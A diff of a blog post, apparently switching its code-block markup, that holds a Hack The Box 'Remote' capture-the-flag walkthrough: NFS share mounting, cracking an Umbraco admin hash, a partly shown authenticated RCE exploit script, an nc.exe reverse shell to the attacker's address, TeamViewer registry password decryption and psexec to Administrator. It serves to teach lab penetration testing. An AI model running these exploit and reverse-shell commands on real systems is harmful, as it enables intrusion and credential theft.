@@ -1,9 +1,8 @@
 ---
-layout: post
-title:  "Hack The Box - Remote"
-date:   2020-09-06 14:23:00 +0800
-categories: hackthebox
-tags: windows nfs umbraco teamviewer
+title: Hack The Box - Remote
+date: 2020-09-06 14:23:00 +0800
+categories: [hackthebox]
+tags: [windows, nfs, umbraco, teamviewer]
 ---
 
 From this write-up, I probably learnt that it is best to get the screenshots and command outputs immediately or while you pwn the box as your exploits may not work in the future. However, it did teach me not to blindly rely on the online scripts to work perfectly everytime and I learnt how to fix them :)
@@ -16,14 +15,14 @@ The operating system that I will be using to tackle this machine is a Kali Linux
 
 What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.
 
-{% highlight bash %}
+```bash
 $ echo "10.10.10.180 remote.htb" >> /etc/hosts
-{% endhighlight %}
+```
 
 # Reconnaissance
 
 Using `nmap`, we are able to determine the open ports and running services on the machine.
-{% highlight bash %}
+```bash
 $ nmap -sV -sT -sC remote.htb
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-22 05:30 EDT
 Nmap scan report for remote.htb (10.10.10.180)
@@ -78,7 +77,7 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 268.43 seconds
 
-{% endhighlight %}
+```
 
 # Enumeration (1)
 
@@ -102,22 +101,22 @@ Going back to the scan results, we see a large chuck of `rpcbind` information fr
 
 Using `showmount`, we can see what `NFS` (Network File Share) shares are available on the service.
 
-{% highlight bash %}
+```bash
 $ showmount -e remote.htb
 Export list for remote.htb:
 /site_backups (everyone)
-{% endhighlight %}
+```
 
 Lets try mounting it on our machine:
 
-{% highlight bash %}
+```bash
 $ mkdir /mnt/nfs
 $ mount -t nfs -o vers=3 remote.htb:/site_backups /mnt/nfs
-{% endhighlight %}
+```
 
 No output but I guess it worked? Lets see whats inside!
 
-{% highlight bash %}
+```bash
 $ cd /mnt/nfs
 $ ls -al
 total 123
@@ -138,13 +137,13 @@ drwx------ 2 4294967294 4294967294  8192 Feb 20 12:16 Umbraco
 drwx------ 2 4294967294 4294967294  4096 Feb 20 12:16 Umbraco_Client
 drwx------ 2 4294967294 4294967294  4096 Feb 20 12:16 Views
 -rwx------ 1 4294967294 4294967294 28539 Feb 20 00:57 Web.config
-{% endhighlight %}
+```
 
 This seem like a folder containing the contents of the `Umbraco` CMS. Since this files and folders could be a backup of the current `Umbraco` instance that is running, lets see if we can find any hard-coded configuration or credentials we can use. 
 
 Digging around, I found a `Umbraco.sdf` under `App_Data`. Searching online, it says that this file was an `SQL` file containing the contents of the `Umbraco` CMS! Nice! However, this file is in binary but we can run `strings` on it and eyeball for information.
 
-{% highlight bash %}
+```bash
 $ strings Umbraco.sdf | less
 ...
 Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
@@ -154,7 +153,7 @@ smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnI
 ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
 ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
 ...
-{% endhighlight %}
+```
 
 Alright, we see what seems to be login information such as the username, email, password hashes as well as the hash algorithm used. We can see 2 users: `admin` and `ssmith`, but hash of `admin@htb.local` is in `SHA1` while the hash of `ssmith@htb.local` is in `HMACSHA256`. `HMACSHA256` needs a key to be cracked but we are not sure how it was implemented in this system but we can definitely crack the `SHA1` hash online.
 
@@ -170,16 +169,16 @@ After pressing "Login", nothing appeared on webpage but we know that the login w
 
 # Exploitation
 
-{% highlight bash %}
+```bash
 $ python umbraco.py -u 'admin@htb.local' -p 'baconandcheese' -i http://remote.htb -c cmd.exe -a "/c whoami"
 k (most recent call last):
   File "umbraco3.py", line 53, in <module>
     VIEWSTATE = soup.find(id="__VIEWSTATE")['value']
-{% endhighlight %}
+```
 
 When I first pwned this box, this exploit was working fine! Fortunately, I was able to debug and realised that the new cookies set after successful logon were not being saved properly, so I tweaked the script a little:
 
-{% highlight python %}
+```python
 # Exploit Title: Umbraco CMS - Authenticated Remote Code Execution 
 # Date: 2020-03-28
 # Exploit Author: Alexandre ZANNI (noraj)
@@ -263,19 +262,19 @@ r4 = s.post(url_xslt, data=data, headers=headers)
 soup = BeautifulSoup(r4.text, 'html.parser')
 CMDOUTPUT = soup.find(id="result").getText()
 print(CMDOUTPUT)
-{% endhighlight %}
+```
 
 Now, lets test it out.
 
-{% highlight bash %}
+```bash
 $ python umbraco.py -u 'admin@htb.local' -p 'baconandcheese' -i http://remote.htb -c cmd.exe -a "/c whoami"
 iis apppool\defaultapppool
 
-{% endhighlight %}
+```
 
 With RCE on the box, we can now upload our `nc.exe` to it and establish a reverse shell.
 
-{% highlight bash %}
+```bash
 $ python umbraco.py -u 'admin@htb.local' -p 'baconandcheese' -i http://remote.htb -c cmd.exe -a "/c mkdir C:\\\\tmp"
 
 $ python -m SimpleHTTPServer 80
@@ -287,10 +286,10 @@ $ nc -lvnp 1337
 istening on [any] 1337 ...
 
 $ python umbraco.py -u 'admin@htb.local' -p 'baconandcheese' -i http://remote.htb -c cmd.exe -a "/c C:\\\\tmp\\\\nc.exe -e cmd.exe 10.10.XX.XX 1337"
-{% endhighlight %}
+```
 
 On our `nc` listener`, we catch our reverse shell.
-{% highlight raw %}
+```
 listening on [any] 1337 ...
 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.180] 49708
 Microsoft Windows [Version 10.0.17763.107]
@@ -298,24 +297,24 @@ Microsoft Windows [Version 10.0.17763.107]
 
 c:\windows\system32\inetsrv>whoami
 iis apppool\defaultapppool
-{% endhighlight %}
+```
 
 # user.txt 
 
 As the current user did not have a home directory, I had to resort to using `where` to find it.
 
-{% highlight raw %}
+```
 c:\windows\system32\inetsrv> where /R C:\ user.txt
 C:\Users\Public\user.txt
 c:\windows\system32\inetsrv> type C:\Users\Public\user.txt
 cf70XXXXXXXXXXXXXXXXXXXXXXXXXXXX
-{% endhighlight %}
+```
 
 # Enumeration (2)
 
 Lets check whats installed on the system.
 
-{% highlight raw %}
+```
 c:\windows\system32\inetsrv> dir "C:\Program Files"
  Volume in drive C has no label.
  Volume Serial Number is BE23-EB3E
@@ -368,11 +367,11 @@ c:\windows\system32\inetsrv> dir "C:\Program Files (x86)"
 09/15/2018  03:19 AM    <DIR>          WindowsPowerShell
                0 File(s)              0 bytes
               17 Dir(s)  19,394,396,160 bytes free
-{% endhighlight %}
+```
 
 "TeamViewer"? This definitely seem worth looking into. Maybe there are saved passwords? I couldn't find any config files containing saved passwords so another location that stores configs is probably the registry.
 
-{% highlight raw %}
+```
 c:\windows\system32\inetsrv> reg query HKLM /s /k /f "TeamViewer"
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\TeamViewer 7
 HKEY_LOCAL_MACHINE\SOFTWARE\TeamViewer
@@ -382,22 +381,22 @@ HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\TeamViewer7
 HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\TeamViewer7
 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TeamViewer7
 End of search: 7 match(es) found
-{% endhighlight %}
+```
 
 `HKEY_LOCAL_MACHINE\SOFTWARE\TeamViewer` seems promising so lets check that out.
 
-{% highlight raw %}
+```
 c:\windows\system32\inetsrv> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\TeamViewer" /s
 ...
 HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7
 ...
     SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
 ...
-{% endhighlight %}
+```
 
 Seems like I was right! Using this script from this [link](https://gist.github.com/rishdang/442d355180e5c69e0fcb73fecd05d7e0), I was able to retrieve the decrypted password.
 
-{% highlight bash %}
+```bash
 $ python3 tv.py 
 
 This is a quick and dirty Teamviewer password decrypter basis wonderful post by @whynotsecurity.
@@ -408,13 +407,13 @@ Please check below mentioned registry values and enter its value manually withou
 
 Enter output from registry without spaces : FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
 Decrypted password is :  !R3m0te!
-{% endhighlight %}
+```
 
 # root.txt
 
 With `!R3m0te!`, lets check if we can get into the `Administrator`'s account.
 
-{% highlight bash %}
+```bash
 $ python psexec.py 'Administrator:!R3m0te!@remote.htb'
 Impacket v0.9.22.dev1+20200713.100928.1e84ad60 - Copyright 2020 SecureAuth Corporation
 
@@ -430,7 +429,7 @@ Microsoft Windows [Version 10.0.17763.107]
 
 C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
 baceXXXXXXXXXXXXXXXXXXXXXXXXXXXX
-{% endhighlight %}
+```
 
 
-## Rooted ! Thank you for reading and look forward for more writeups and articles !
+### Rooted ! Thank you for reading and look forward for more writeups and articles !
